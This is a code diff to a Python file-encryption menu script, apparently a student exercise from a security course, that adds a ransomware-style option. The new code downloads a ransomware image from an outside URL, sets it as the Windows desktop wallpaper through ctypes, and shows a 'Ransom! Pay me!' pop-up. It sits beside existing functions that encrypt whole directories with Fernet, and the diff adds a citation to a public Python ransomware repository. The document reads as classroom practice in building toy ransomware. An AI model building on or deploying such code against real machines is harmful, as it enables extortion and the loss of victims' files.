@@ -10,6 +10,8 @@ from cryptography.fernet import Fernet
 import os
 import os.path
 import sys
+import urllib.request
+import ctypes
 
 # Start
 
@@ -23,7 +25,8 @@ def menu():
                     5. Encrypt a Directory
                     6. Decrypt a Directory
                     7. Write New Key
-                    8. Exit
+                    8. Add Ransomeware Message
+                    9. Exit
                     
                     Please Enter Your Choice: """)
     if option == '1':
@@ -54,6 +57,10 @@ def menu():
         write_key()
 
     elif option == '8':
+        ransomeware()
+        popupmsg()
+
+    elif option == '9':
         sys.exit()
 
     else: print ("Please select a number 1 thru 8.")
@@ -126,6 +133,21 @@ def dir_decrypt(dir_path):
             filename = (os.path.join(root, file))
             decrypt_file(filename)
     
+# Change Desktop
+def ransomeware():
+    imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
+    # Go to specif url and download+save image using absolute path
+    path = f'/home/dean/ops-401d5-code/ransomeware.jpg'
+    urllib.request.urlretrieve(imageUrl, path)
+    SPI_SETDESKWALLPAPER = 20
+    # Access windows dlls for funcionality eg, changing dekstop wallpaper
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
+
+# Pop Up Function
+def popupmsg():
+    message = ctypes.windll.user32.MessageBoxW
+    message(0, "Ransom!", " Pay me!", 1)
+    
 # Call Menu Function
 while True:
     menu()
@@ -137,5 +159,6 @@ while True:
 # Resources
 # https://www.teachyourselfpython.com/challenges.php?a=04_Mini_Projects_NEA_Samples_Tutorials&t=02_Netflix_type_Program_NEA_OCR_Task2&s=01_Main_Menu_Start_Screen
 # https://www.techgeekbuzz.com/blog/how-to-encrypt-and-decrypt-files-in-python/
+# https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py
 
 # Notes from Class
